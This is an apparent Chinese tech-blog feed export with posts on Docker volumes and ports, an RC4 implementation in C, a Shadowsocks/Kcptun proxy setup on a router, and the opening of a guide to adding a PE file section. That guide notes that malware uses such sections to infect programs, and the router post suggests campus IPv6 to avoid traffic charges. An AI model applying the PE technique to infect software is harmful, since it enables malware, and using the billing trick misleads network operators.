<p>然后，在其他容器中使用 –volumes-from 来挂载 dbdata 容器中的数据卷。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it --volumes-<span class="keyword">from</span> dbdata --name db1 <span class="number">2</span>d696 bash                                                                      </div><div class="line">root@<span class="number">1</span>a40cd12ae27:/<span class="comment"># cd dbdata/       </span></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment"># ls</span></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment">#</span></div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo docker run -it --volumes-<span class="keyword">from</span> dbdata --name db2 <span class="number">2</span>d696 bash</div><div class="line">root@<span class="number">5</span>d7f11a015f0:/<span class="comment"># ls</span></div><div class="line">bin  boot  dbdata  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</div><div class="line">root@<span class="number">5</span>d7f11a015f0:/<span class="comment"># cd dbdata/</span></div><div class="line">root@<span class="number">5</span>d7f11a015f0:/dbdata<span class="comment"># ls</span></div><div class="line">root@<span class="number">5</span>d7f11a015f0:/dbdata<span class="comment"># mkdir testvolume</span></div><div class="line"></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment"># ls</span></div><div class="line">testvolume</div></pre></td></tr></table></figure></p>
<h3 id="0x05-网络配置"><a href="#0x05-网络配置" class="headerlink" title="0x05 网络配置"></a><strong>0x05 网络配置</strong></h3><p>通过 -P 或 -p 参数进行端口映射可以在外部访问容器中的网络应用。当使用 -P 标记时，Docker 会随机映射一个 49000~49900 的端口到内部容器开放的网络端口。</p>
<p>-p 则可以指定要映射的端口，在一个指定端口上只可以绑定一个容器。</p>
<h4 id="1）端口映射"><a href="#1）端口映射" class="headerlink" title="1）端口映射"></a><strong>1）端口映射</strong></h4><p>使用 <code>hostPort:containerPort</code> 将本地的 6666 端口映射到容器的 6666 端口。此时默认会绑定本地所有接口上的所有地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it -d  -p 6666:6666 2d696 bash</div><div class="line">d6112543fa80c1c939f3ef0653efb7c5c29a5ccccc4dcae8fc81c764e743d1ff</div><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</div><div class="line">d6112543fa80        2d696               "bash"              4 seconds ago       Up 3 seconds        0.0.0.0:6666-&gt;6666/tcp   objective_lumiere</div></pre></td></tr></table></figure></p>
<h4 id="2）查看映射端口"><a href="#2）查看映射端口" class="headerlink" title="2）查看映射端口"></a><strong>2）查看映射端口</strong></h4><p>使用 <code>docker port</code> 可查看当前映射的端口配置，也可以查看绑定的地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker port d611</div><div class="line">6666/tcp -&gt; 0.0.0.0:6666</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="external">Docker — 从入门到实践</a><br>[2] <a href="https://blog.kinpzz.com/2017/05/16/docker-ci-cd/" target="_blank" rel="external">Docker 入门 &amp; CI/CD实践</a>       </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RC4 算法实现]]></title>
      <url>/RC4%20%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/</url>
      <content type="html"><![CDATA[<p>RC4 是一种对称秘钥流加密算法，对称加密算法使用的加密和解密秘钥是相同的，或是从其中一个能很容易推导出另一个。RC4 算法的特点是算法简单，运行速度快，而且密钥长度是可变的，密钥长度范围为 1-256 字节。</p>
<h3 id="0x01-算法原理"><a href="#0x01-算法原理" class="headerlink" title="0x01 算法原理"></a><strong>0x01 算法原理</strong></h3><p>算法主要包括两个部分：1）使用 key-scheduling algorithm (KSA) 算法根据用户输入的秘钥 key 生成 S 盒；2）使用 Pseudo-random generation algorithm (PRGA) 算法生成秘钥流用于加密数据。</p>
<h4 id="1）初始化-S-盒"><a href="#1）初始化-S-盒" class="headerlink" title="1）初始化 S 盒"></a><strong>1）初始化 S 盒</strong></h4><p>KSA算法初始化长度为 256 的 S 盒。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒；第二个 for 循环根据密钥打乱 S 盒。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">255</span></div><div class="line">    S[i] := i</div><div class="line">endfor</div><div class="line">j := <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">255</span></div><div class="line">    j := (j + S[i] + key[i mod keylength]) mod <span class="number">256</span></div><div class="line">    swap values of S[i] <span class="keyword">and</span> S[j]</div><div class="line">endfor</div></pre></td></tr></table></figure></p>
<h4 id="2-加密"><a href="#2-加密" class="headerlink" title="2) 加密"></a><strong>2) 加密</strong></h4><p>Pseudo-random generation algorithm (PRGA) 算法根据 S 盒生成与明文长度相同的秘钥流，使用秘钥流加密明文。秘钥流的生成如下图所示：<br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/RC4.svg/800px-RC4.svg.png" alt=""><br>循环体中每收到一个字节，a 和 b 定位S盒中的一个元素，并与输入字节异或，得到密文 k；同时，c 还改变了 S 盒。由于异或运算的特性，使得加密与解密过程一致。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">i := <span class="number">0</span></div><div class="line">j := <span class="number">0</span></div><div class="line"><span class="keyword">while</span> GeneratingOutput:</div><div class="line">    i := (i + <span class="number">1</span>) mod <span class="number">256</span>  <span class="comment">// a</span></div><div class="line">    j := (j + S[i]) mod <span class="number">256</span> <span class="comment">// b</span></div><div class="line">    swap values of S[i] <span class="keyword">and</span> S[j]  <span class="comment">// c</span></div><div class="line">    K := inputByte ^ S[(S[i] + S[j]) mod <span class="number">256</span>] <span class="comment">// d</span></div><div class="line">    output K</div><div class="line">endwhile</div></pre></td></tr></table></figure></p>
<h3 id="0x02-算法实现"><a href="#0x02-算法实现" class="headerlink" title="0x02 算法实现"></a><strong>0x02 算法实现</strong></h3><p><a href="https://opensource.apple.com/source/xnu/xnu-1456.1.26/bsd/crypto/rc4/rc4.c" target="_blank" rel="external">开源项目</a>中的算法实现（稍作修改）如下。</p>
<h4 id="1）开源实现"><a href="#1）开源实现" class="headerlink" title="1）开源实现"></a><strong>1）开源实现</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// RC4.h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _SYS_CRYPTO_RC4_RC4_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _SYS_CRYPTO_RC4_RC4_H_</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rc4_state</span> &#123;</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  perm[<span class="number">256</span>];</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  index1;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  index2;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">int</span> keylen)</span></span>;</div><div class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *inbuf, <span class="keyword">unsigned</span> <span class="keyword">char</span> *outbuf, <span class="keyword">int</span> buflen)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_bytes</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *a, <span class="keyword">unsigned</span> <span class="keyword">char</span> *b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</div><div class="line">    temp = *a;</div><div class="line">    *a = *b;</div><div class="line">    *b = temp;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">* Initialize an RC4 state buffer using the supplied key,</div><div class="line">* which can have arbitrary length.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">int</span> keylen)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line"></div><div class="line">    <span class="comment">/* Initialize state with identity permutation */</span></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</div><div class="line">        state-&gt;perm[i] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)i;</div><div class="line">    state-&gt;index1 = <span class="number">0</span>;</div><div class="line">    state-&gt;index2 = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Randomize the permutation using key data */</span></div><div class="line">    <span class="keyword">for</span> (j = i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</div><div class="line">        j = (j + state-&gt;perm[i] + key[i % keylen]) % <span class="number">256</span>;</div><div class="line">        swap_bytes(&amp;state-&gt;perm[i], &amp;state-&gt;perm[j]);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">* Encrypt some data using the supplied RC4 state buffer.</div><div class="line">* The input and output buffers may be the same buffer.</div><div class="line">* Since RC4 is a stream cypher, this function is used</div><div class="line">* for both encryption and decryption.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state,</span></span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *inbuf, <span class="keyword">unsigned</span> <span class="keyword">char</span> *outbuf, <span class="keyword">int</span> buflen)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; buflen; i++) &#123;</div><div class="line"></div><div class="line">        <span class="comment">/* Update modification indicies */</span></div><div class="line">        state-&gt;index1 = (state-&gt;index1 + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">        state-&gt;index2 = (state-&gt;index2 + state-&gt;perm[state-&gt;index1]) % <span class="number">256</span>;</div><div class="line"></div><div class="line">        <span class="comment">/* Modify permutation */</span></div><div class="line">        swap_bytes(&amp;state-&gt;perm[state-&gt;index1], &amp;state-&gt;perm[state-&gt;index2]);</div><div class="line"></div><div class="line">        <span class="comment">/* Encrypt/decrypt next byte */</span></div><div class="line">        j = (state-&gt;perm[state-&gt;index1] + state-&gt;perm[state-&gt;index2]) % <span class="number">256</span>;</div><div class="line">        outbuf[i] = inbuf[i] ^ state-&gt;perm[j];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
<h4 id="2）测试"><a href="#2）测试" class="headerlink" title="2）测试"></a><strong>2）测试</strong></h4><p>使用以下代码进行测试加密和解密的结果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"RC4.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 50</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> plaintext[LEN] = &#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> crypt[LEN]&#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> decrypt[LEN]&#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[LEN] = <span class="string">"1234567890"</span>;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rc4_state</span> <span class="title">state</span>;</span></div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, plaintext);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"plaintext:\n"</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>, plaintext[i]);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        rc4_init(&amp;state, key, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)key));<span class="comment">// this code is very important</span></div><div class="line">        rc4_crypt(&amp;state, plaintext, crypt, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n\ncrypt:\n"</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c,"</span>, crypt[i]);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n\ndecrypt: \n"</span>);</div><div class="line">        rc4_init(&amp;state, key, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)key));<span class="comment">// this code is very important</span></div><div class="line">        rc4_crypt(&amp;state, crypt, decrypt, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>, decrypt[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n-------------------------------------------------\n\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行结果如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/17-9-19/88889666.jpg" alt=""></p>
<hr>
<p>References:<br>[1] <a href="https://en.wikipedia.org/wiki/RC4" target="_blank" rel="external">RC4</a><br>[2] <a href="http://gttiankai.github.io/2015/01/18/Rc4.html" target="_blank" rel="external">流加密RC4的C语言实现</a><br>[3] <a href="http://www.cnblogs.com/zibility/p/5404478.html" target="_blank" rel="external">RC4加密算法</a></p>
]]></content>
      
        <categories>
            
            <category> 加密解密 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RC4 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在斐讯 K2 上部署 Shadowsocks+Kcptun]]></title>
      <url>/%E5%9C%A8%E6%96%90%E8%AE%AF%20K2%20%E4%B8%8A%E5%AE%89%E8%A3%85%20kcptun/</url>
      <content type="html"><![CDATA[<p>对于程序员来说，能顺畅使用互联网能够很大程度地提高工作效率。所以，通过 SS 来实现代理上网是一个很好的解决方案。此外，对于能使用校园网的学生党而言，还可以使用 SS + IPv6 来实现免流，这样就能把省下来的网费用来买VPS了。</p>
<p>然而，在 PC 上直接使用客户端软件代理上网有以下缺点：<br>1）不能实现全局流量的代理功能，只有支持代理功能的应用才能通过 SS 代理上网。虽然有相关的软件可以实现全局流量代理，但这样就很不方便，为了代理上网要多开好几个应用。<br>2）如果手机等其他设备也想使用代理，也必须得用客户端才能行。</p>
<p>为了能方便地在多个终端使用代理，可以在路由器上部署 SS 客户端，那么经过这台路由器的所有流量都能走代理，对于终端设备上的所有应用而言，代理是透明的。</p>
<h3 id="0x01-前提条件"><a href="#0x01-前提条件" class="headerlink" title="0x01 前提条件"></a><strong>0x01 前提条件</strong></h3><p>首先需要一台已部署好 Shadowsocks 和 Kcptun 的 VPS，服务器上安装 SS 和 Kcptun 相对要简单一些，可以在网络上能找到脚本实现一键安装。安装好之后在 PC 上安装相应的客户端软件，设置好参数并测试服务端能否正常使用。</p>
<p>下面是在斐讯 K2 上部署 SS 和 Kcptun 的过程。</p>
<h3 id="0x02-部署-SS"><a href="#0x02-部署-SS" class="headerlink" title="0x02 部署 SS"></a><strong>0x02 部署 SS</strong></h3><h4 id="1）安装软件包"><a href="#1）安装软件包" class="headerlink" title="1）安装软件包"></a><strong>1）安装软件包</strong></h4><p>透明代理使用 Shadowsocks-libev 和 ChinDNS 实现。使用 ssh 登陆路由器，安装相关软件包。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">opkg update</div><div class="line">opkg install shadowsocks-libev luci-app-shadowsocks ChinaDNS luci-app-chinadns --force-checksum</div></pre></td></tr></table></figure></p>
<h4 id="2）更新-chnroute-表"><a href="#2）更新-chnroute-表" class="headerlink" title="2）更新 chnroute 表"></a><strong>2）更新 chnroute 表</strong></h4><p>使用以下命令更新：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -O- &apos;http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest&apos; | awk -F\| &apos;/CN\|ipv4/ &#123; printf(&quot;%s/%d\n&quot;, $4, 32-log($5)/log(2)) &#125;&apos; &gt; /etc/chnroute.txt</div></pre></td></tr></table></figure></p>
<h4 id="3）配置SS"><a href="#3）配置SS" class="headerlink" title="3）配置SS"></a><strong>3）配置SS</strong></h4><p>首先根据 SS 服务器中已设参数配置好 SS 的全局设置，包括以下参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器地址：2607:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx  # 校园网 IPV6 免流</div><div class="line">服务器端口: 443</div><div class="line">密码：xxxxxx</div><div class="line">加密方式：aes-256-cfb</div></pre></td></tr></table></figure></p>
<p>配置透明代理：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">端口：1081</div><div class="line">忽略列表：/etc/chnroute.txt（如果使用全局代理则留空）</div><div class="line">代理协议：TCP+UDP</div></pre></td></tr></table></figure></p>
<p>配置UDP转发（ss-tunnel）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UDP本地端口：1153</div><div class="line">UDP转发地址：8.8.8.8:53</div></pre></td></tr></table></figure></p>
<p>配置 ChinaDNS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Enable Bidirectional Filter：启用</div><div class="line">Enable DNS compression pointer：启用</div><div class="line">本地端口：1053  //不能与ss-tunnel冲突</div><div class="line">CHNRoute File：/etc/chnroute.txt</div><div class="line">Upstream Servers：223.5.5.5,127.0.0.1:1153 //第一个是阿里DNS，第二个为 ss-tunnel 转发后的 Google DNS</div></pre></td></tr></table></figure></p>
<p>配置DHCP/DNS：<br>依次点击 <code>网络 -&gt; DHCP/DNS -&gt; 服务器设置</code> 进行设置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">一般配置</div><div class="line">DNS转发：127.0.0.1#1053</div><div class="line"></div><div class="line">HOSTS和解析文件</div><div class="line">忽略解析文：启用</div></pre></td></tr></table></figure></p>
<p>具体流程为， ss-tunnel 将 GoogleDNS(8.8.8.8:53) 转发到 127.0.0.1:1153 上，然后通过 ChinaDNS 与国内 DNS 组合成新的 127.0.0.1:1053，从而实现了国内外分流。</p>
<h3 id="0x03-部署-Kcptun"><a href="#0x03-部署-Kcptun" class="headerlink" title="0x03 部署 Kcptun"></a><strong>0x03 部署 Kcptun</strong></h3><p>Kcptun 部署需要确保服务端和客户端版本的一致性，只有版本一致才能正常使用。首先<br>在 <a href="https://github.com/xtaci/kcptun/releases" target="_blank" rel="external">kcptun项目</a> 中下载相应版本的客户端，这里下载 <a href="https://github.com/xtaci/kcptun/releases/download/v20170525/kcptun-linux-mipsle-20170525.tar.gz" target="_blank" rel="external">kcptun-linux-mipsle-20170525.tar.gz</a>，解压后将 client_linux_mipsle 上传至路由器中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp client_linux_mipsle root@192.168.1.1:/root/kcptun</div></pre></td></tr></table></figure></p>
<p>修改 /etc/rc.local 设置 kcptun 为开机启动。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># Put your custom commands here that should be executed once</div><div class="line"># the system init finished. By default this file does nothing.</div><div class="line"></div><div class="line">/root/kcptun/client_linux_mipsle -l 127.0.0.1:8388 -r xxx.xxx.xxx.xxx:9523 -key xxxxxx -mtu 1350 -sndwnd 512 -rcvwnd 512 -mode fast2 -crypt aes-192  &gt; /root/kcptun/kcptun.log 2&gt;&amp;1 &amp;</div><div class="line"></div><div class="line">exit 0</div></pre></td></tr></table></figure></p>
<p>注释：<br>/root/kcptun/client_linux_mipsle：client_linux_mipsle的绝对路径<br>-l：kcptun 本地监听的端口<br>-r：kcptun 服务器地址（可设置为 IPv6）和端口<br>-key：kcptun的通讯密钥</p>
<p>修改 SS 客户端服务器 IP 和端口，密码等其他参数仍为原 SS 的参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务器地址：127.0.0.1</div><div class="line">服务器端口: 8388</div></pre></td></tr></table></figure></p>
<p>重启路由器后测试能否访问 Google。此外，还可以安装 <a href="https://blog.kuoruan.com/113.html" target="_blank" rel="external">Kcptun 的 web 管理界面</a>。</p>
<hr>
<p>References:<br>[1] <a href="http://www.right.com.cn/forum/thread-202060-1-1.html" target="_blank" rel="external">在openwrt上部署kcptun给搬瓦工加速看1080p</a><br>[2] <a href="https://keyin.me/2017/02/07/Pandorabox-transparent-proxy/" target="_blank" rel="external">Pandorabox之透明代理</a><br>[3] <a href="https://blog.kuoruan.com/102.html" target="_blank" rel="external">Kcptun加速方案</a><br>[4] <a href="http://www.bwgcn.xyz/?p=159" target="_blank" rel="external">如何用Kcptun给Shadowsocks加速？</a><br>[5] <a href="https://blog.kuoruan.com/113.html" target="_blank" rel="external">OpenWrt 平台 Kcptun 管理界面 lui-app-kcptun</a><br>[6] <a href="http://aes.jypc.org/?p=19339" target="_blank" rel="external">Openwrt华硕固件Kcptun配置使用教程</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 斐讯 K2 </tag>
            
            <tag> Shadowsocks </tag>
            
            <tag> kcptun，IPv6 免流 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PE文件中添加节区]]></title>
      <url>/PE%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0%E8%8A%82%E5%8C%BA/</url>
      <content type="html"><![CDATA[<p>在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。</p>
<p>打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙中。对于恶意代码而言，以这种方式感染目标文件更具隐蔽性。</p>
<p>当补丁代码或病毒需注入的代码量较大时，可以在 PE 文件的末尾添加一个节区用于存储这些代码。下面介绍如何在 PE 文件中添加一个节区。</p>
<h3 id="0x01-手动添加"><a href="#0x01-手动添加" class="headerlink" title="0x01 手动添加"></a><strong>0x01 手动添加</strong></h3><p>使用 C32asm 可以很方便地定位并修改 PE 文件的各个字段，点击 “查看” / “PE信息” 可打开 PE 结构字段的解析面板。添加节区的具体流程如下。</p>
<h4 id="1）添加一个-IMAGE-SECTION-HEADER"><a href="#1）添加一个-IMAGE-SECTION-HEADER" class="headerlink" title="1）添加一个 IMAGE_SECTION_HEADER"></a><strong>1）添加一个 IMAGE_SECTION_HEADER</strong></h4><p>首先在原来节表的末尾添加一个节表，IMAGE_SECTION_HEADER 结构体中要设置的字段有以下6个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Name: .new</div><div class="line">VirtualSize: 0x450 // 该字段可不用对齐</div><div class="line">VirtualAddress: 0x9000 // 上一节区的 VirtualAddress + 对齐后的 VirtualSize</div><div class="line">SizeOfRawData: 0x600 // 该字段为对齐后的值</div><div class="line">PointerToRawData: 0x5200 // 上一节区的 PointerToRawData + SizeOfRawData</div><div class="line">Characteristics：0x60000020  // 与 .text段一致</div></pre></td></tr></table></figure></p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/52134100.jpg" alt=""></p>
